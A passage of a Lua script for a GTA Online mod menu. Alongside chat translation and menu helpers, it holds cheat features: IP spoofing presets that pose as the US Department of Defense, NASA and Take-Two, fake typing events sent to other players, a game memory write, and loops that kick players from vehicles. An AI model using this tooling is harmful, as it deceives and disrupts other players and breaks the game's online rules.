			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast(players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)


run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end

	menu.action(detections,"Check Stats", {"check stats"}, "Weak",function(on)
			-- modder detection stuff here
			for pid = 0, 31 do
				local rp = players.get_rank(pid)
				local money = players.get_money(pid)
				local kd = players.get_kd(pid)
				if rp == 120 or rp == 720 or rp >= 1000 then
					--notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded RP", colors.red)
				end
				if money >= 500000000 then
					--notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded Money", colors.red)
				end
				if kd <= -1 or kd >= 50 then
					--notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is Weak: Modded KD", colors.red)
				end
			end
	end)


spoofpresets = menu.list(protex, "IP Spoofer Repository", {}, "Stand's default GeoIP may show wrong location on some presets", function(); end)

	menu.action(spoofpresets, "Enable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip on")
	end)

	menu.action(spoofpresets, "Disable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip off")
	end)

	menu.divider(spoofpresets, "Fun IP Presets")

	menu.action(spoofpresets, "Computer Problem Solving (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.146." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "US Department of Defense", {}, "", function()
		menu.trigger_commands("spoofedip " .. "155.21." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "NASA (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.169." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Apple (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "17.234." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Akamai (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "23.66." .. tostring(math.random(16, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "40.89." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.144." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	t2spoofpresets = menu.list(spoofpresets, "Take-Two", {}, "", function(); end)
	
	menu.action(t2spoofpresets, "Take-Two (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.227." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (US)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "192.81." .. tostring(math.random(240, 244)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138." .. tostring(math.random(231, 232)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (AU)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "139.138.226." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138.244." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.233." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (ES)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.247." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.236." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CZ)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.237." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (IN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.224." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (SG)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.228." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.229." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.230." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.238." .. tostring(math.random(0, 255)))
	end)

	menu.divider(spoofpresets, "VPN IP Presets")

	octospoofpresets = menu.list(spoofpresets, "OVH", {}, "", function(); end)

	menu.action(octospoofpresets, "OVH (AU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.99." .. tostring(math.random(232, 234)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(octospoofpresets, "OVH (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "145.239.235." .. tostring(math.random(40, 111)))
	end)

	menu.action(octospoofpresets, "OVH (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.89.208." .. tostring(math.random(88, 95)))
	end)

	menu.action(octospoofpresets, "OVH (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.81.119." .. tostring(math.random(0, 15)))
	end)

	menu.action(octospoofpresets, "OVH (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "192.99.250." .. tostring(math.random(208, 223)))
	end)

	tempestpresets = menu.list(spoofpresets, "Tempest Hosting", {}, "", function(); end)

	menu.action(tempestpresets, "Tempest Hosting (US-NY)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (US-CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(0, 127)))
	end)
	
	menu.action(tempestpresets, "Tempest Hosting (US-FL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.255." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (RU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(127, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(0, 127)))
	end)

	menu.divider(spoofpresets, "Residential IP Presets")

	menu.action(spoofpresets, "Russia", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "109.252." .. tostring(math.random(40, 45)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "92.100." .. tostring(math.random(178, 182)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217.107." .. tostring(math.random(82, 98)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "95.24." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "China", {}, "", function()
		menu.trigger_commands("spoofedip " .. "42.123." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Australia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.168." .. tostring(math.random(40, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Chicago", {}, "", function()
		menu.trigger_commands("spoofedip " .. "73.110." .. tostring(math.random(149, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Baltimore", {}, "", function()
		menu.trigger_commands("spoofedip " .. "69.67." .. tostring(math.random(80, 95)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Texas", {}, "AT&T / IBM", function()
		menu.trigger_commands("spoofedip " .. "198.81.193." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Germany", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "84.56." .. tostring(math.random(218, 231)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "46.223." .. tostring(math.random(234, 251)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "93." .. tostring(math.random(192, 255)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "89.14." .. tostring(math.random(120, 124)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Italy", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "5.89." .. tostring(math.random(190, 197)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.200." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Netherlands", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "217.123." .. tostring(math.random(124, 125)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(100, 105)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "139.156." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "94.212." .. tostring(math.random(40, 47)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "France", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.10." .. tostring(math.random(134, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "United Kingdom", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "81.109." .. tostring(math.random(120, 130)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.33." .. tostring(math.random(88, 90)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "2.217." .. tostring(math.random(20, 30)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "86.0." .. tostring(math.random(54, 60)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Ireland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.203." .. tostring(math.random(0, 10)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Switzerland", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "85.0." .. tostring(math.random(41, 43)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "84.73." .. tostring(math.random(0, 115)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Austria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "194.166." .. tostring(math.random(250, 252)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Denmark", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "83.92." .. tostring(math.random(121, 124)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "87.104." .. tostring(math.random(64, 127)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Belgium", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.111." .. tostring(math.random(2, 4)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Spain", {}, "", function()
		menu.trigger_commands("spoofedip " .. "93.176." .. tostring(math.random(154, 155)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Portugal", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.61." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Norway", {}, "", function()
		menu.trigger_commands("spoofedip " .. "80.213." .. tostring(math.random(174, 181)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Finland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "88.113." .. tostring(math.random(64, 83)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Sweden", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "78.72." .. tostring(math.random(240, 245)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "151.252." .. tostring(math.random(128, 172)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Slovakia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.64." .. tostring(math.random(50, 55)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Romania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.117." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Poland", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "178.36." .. tostring(math.random(221, 229)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "193.17." .. tostring(math.random(174, 174)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(96, 99)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Czech Republic", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.91." .. tostring(math.random(164, 166)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Bulgaria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.154." .. tostring(math.random(162, 164)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Slovenia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "77.111." .. tostring(math.random(53, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Croatia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.133." .. tostring(math.random(132, 135)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Albania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.106." .. tostring(math.random(160, 191)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Lithuania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.140." .. tostring(math.random(13, 13)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Hungary", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.2." .. tostring(math.random(137, 137)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Greece", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.85." .. tostring(math.random(227, 227)) .. "." .. tostring(math.random(0, 255)))
	end)

ColorRepo = menu.list(protex, "Color Repository", {"colorrepo"}, "", function(); end)
BasicColors = menu.list(ColorRepo, "Basic Colors", {}, "", function(); end)
SecondaryColors = menu.list(ColorRepo, "Secondary Colors", {}, "", function(); end)

menu.action(BasicColors, "Red", {"red"}, "Copies a red hex value to your clipboard", function()
	util.copy_to_clipboard("ff0000")
end)

menu.action(BasicColors, "Green", {"green"}, "Copies a green hex value to your clipboard", function()
	util.copy_to_clipboard("00ff00")
end)

menu.action(BasicColors, "Blue", {"blue"}, "Copies a blue hex value to your clipboard", function()
	util.copy_to_clipboard("0000ff")
end)

menu.action(BasicColors, "Yellow", {"yellow"}, "Copies a yellow hex value to your clipboard", function()
	util.copy_to_clipboard("ffff00")
end)

menu.action(BasicColors, "Purple", {"purple"}, "Copies a purple hex value to your clipboard", function()
	util.copy_to_clipboard("800080")
end)

menu.action(BasicColors, "Orange", {"orange"}, "Copies an orange hex value to your clipboard", function()
	util.copy_to_clipboard("ffa500")
end)

menu.action(BasicColors, "White", {"white"}, "Copies a white hex value to your clipboard", function()
	util.copy_to_clipboard("ffffff")
end)

menu.action(BasicColors, "Black", {"black"}, "Copies a black hex value to your clipboard", function()
	util.copy_to_clipboard("000000")
end)

menu.action(SecondaryColors, "Magenta", {"magenta"}, "Magenta color for magenta menu", function()
	util.copy_to_clipboard("ff00FF")
end)

menu.action(SecondaryColors, "CEO of Crash", {"ceoofcrash"}, "The color I personally use, in case you wanted it", function()
	util.copy_to_clipboard("00ffa8")
end)


faketype = menu.list(protex, "Spoof Typing indicator", {}, "", function(); end)

menu.action(faketype, "Start Fake Typing", {}, "Will show a typing indicator above your nickname and also make other menus think that you're typing in chat", function()
	menu.trigger_commands("hidetyping off")
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(747270864, pids, {players.user(), pids, 6769})
		end
	end
end)

menu.action(faketype, "Stop Fake Typing", {}, "", function()
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(-990958325, pids, {players.user(), pids, 7556})
		end
	end
end)

menu.toggle(faketype, "Anti-Type", {}, "AKA 'Suppress Typing Indicator', hides the fact that you're typing", function(on)
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.action(protex, "Fix Casino Heist", {}, "If you've bricked your casino heist by not doing the scoping mission, give this a try :)", function()
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_POI"), 0, true)
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_ACCESSPOINTS"), 0, true)
end)

menu.toggle_loop(protex, "Accept Joins", {"autojoin"}, "Automatically accept join screens", function()
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(200)
    end
end)

menu.toggle_loop(protex, "Auto Enter", {"autoenter"}, "Automatically hits enter.", function()
    HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
    util.yield(100)
end)

menu.toggle(protex, "Rejoin Failed Joins", {"rejoinfail"}, "Joins previously failed transitions, Joins previously failed sessions but if failed will join new public.", function(state)
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    local my_player_id = players.user_ped()
    local playerstatus = {0, 1} -- This tells the player status, 0 for story mode and 1 for online mode.
    local message_hashes = {15890625, -398982408, -587688989} 
    if state then
        if message_hash == message_hashes then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
            util.yield(200)
        end

        if my_player_id == playerstatus then
            NETWORK.NETWORK_JOIN_PREVIOUSLY_FAILED_TRANSITION(0, true)
            NETWORK.NETWORK_JOIN_PREVIOUSLY_FAILED_SESSION(0, true)

            wait_session_transition()
            util.toast("Rejoining :)")
            menu.trigger_commands("rejoin ")
        else
            util.toast("Failed to join :/")
            menu.trigger_commands("go newpublic")
        end
    end
end)

players.dispatch_on_join()

menu.toggle(protex, "Stand User Identification", {}, "Identifies other Stand users but also allows them to identify you.", function(on_toggle)
    local standid = menu.ref_by_path("Online>Protections>Detections>Stand User Identification")
    if on_toggle then
        menu.trigger_command(standid, "on")
    else
        menu.trigger_command(standid, "off")
    end
end)

menu.toggle_loop(protex, 'Increase Kosatka Missile Range', {'krange'}, 'You can use it anywhere in the map now', function ()
    if util.is_session_started() then
    memory.write_float(memory.script_global(262145 + 30176), 200000.0)
    end
end)

joining = false
menu.toggle(protex, "Player Joining --notifications", {}, "", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)


local InitialPlayersList = players.list(true, true, true) -- Obtain list of players from Stand API
for i=1, #InitialPlayersList do -- Loop through the received player list
	GenerateFeatures(InitialPlayersList[i]) -- Generate Features for every player
end
InitialPlayersList = nil -- Discard the table as it is no longer needed (optional; most beginners will not do this)

players.on_join(function(pid)
	while true do
		if joining then
			--notification(PLAYER.GET_PLAYER_NAME(pid) .. " joined", colors.red)
		end
		util.yield()
	end
end)

players.on_join(GenerateFeatures)
players.on_leave(update_leave)
players.on_join(update_join)
--util.on_stop(cleanup)

--for vehicle chaos
util.create_thread(function()
	while true do
		if (chaos) then
			vehicles = entities.get_all_vehicles_as_handles()
			cur_players = players.list(true,true,true)
			for k,v in pairs(vehicles) do
				driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(v, -1)
				if(PED.GET_PED_TYPE(driver) > 4) then
					VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(v, false, true)
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(v, speed)
					VEHICLE.SET_VEHICLE_GRAVITY(v, gravity)
				end
			end
		end
		util.yield()
	end
end)

	-- for car drifting
util.create_thread(function()
	while true do
		if drift then
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
		end
		util.yield()
	end
end)



--for oppressor blacklist
util.create_thread(function()
	while true do
		if oppressor_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("oppressor2")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

--for lazer blacklist
util.create_thread(function()
	while true do
		if lazer_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("lazer")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

--for kosatka blacklist
util.create_thread(function()
	while true do
		if kosatka_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("kosatka")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

--for hydra blacklist
util.create_thread(function()
	while true do
		if hydra_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("hydra")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

--for khanjali blacklist
util.create_thread(function()
	while true do
		if khanjali_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("khanjali")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

defaults = {
	["r"] = 255/255,
	["g"] = 255/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
god = { -- need to find memory address
	["r"] = 255/255,
	["g"] = 175/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
interior = { -- done
	["r"] = 150/255,
	["g"] = 150/255,
	["b"] = 150/255,
	["a"] = 255/255
} 
otr = { -- done
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 255/255,
	["a"] = 255/255
}
host = {
	["r"] = 255/255,
	["g"] = 200/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
dead = {
	["r"] = 175/255,
	["g"] = 100/255,
	["b"] = 100/255,
	["a"] = 255/255
} 
modder = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 0/255,
	["a"] = 255/255
}  
friend = {
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 0/255,
	["a"] = 255/255
}
spectating = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 255/255,
	["a"] = 255/255
}
wanted = {
	["r"] = 255/255,
	["g"] = 255/255,
	["b"] = 0/255,
	["a"] = 255/255
}


playerbar = false
util.create_thread(function() -- player bar
	while true do
		if playerbar then
			local PlayersList = players.list(true, true, true) 
			if #PlayersList < 11 then
				draw_box(0, 0, 1, 0.02, 0.5)
			elseif #PlayersList < 21 then
				draw_box(0, 0, 1, 0.036, 0.5)
			elseif #PlayersList < 31 then
				draw_box(0, 0, 1, 0.055, 0.5)
			else
				draw_box(0, 0, 1, 0.07, 0.5)
			end
			local posx = 0.500
			local posy = 0.001

			for _, pid in pairs (PlayersList) do 
				if true then
					local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
					local PlayerVehicle = PED.GET_VEHICLE_PED_IS_IN(PlayerPed, false)
					local color = defaults
					local tag = ""
					local getotr = memory.script_global(2689156 + (1 + (pid * 453)) + 209)
					local PlayerName = PLAYER.GET_PLAYER_NAME(pid)
					PlayerHandle = memory.alloc(13*4)
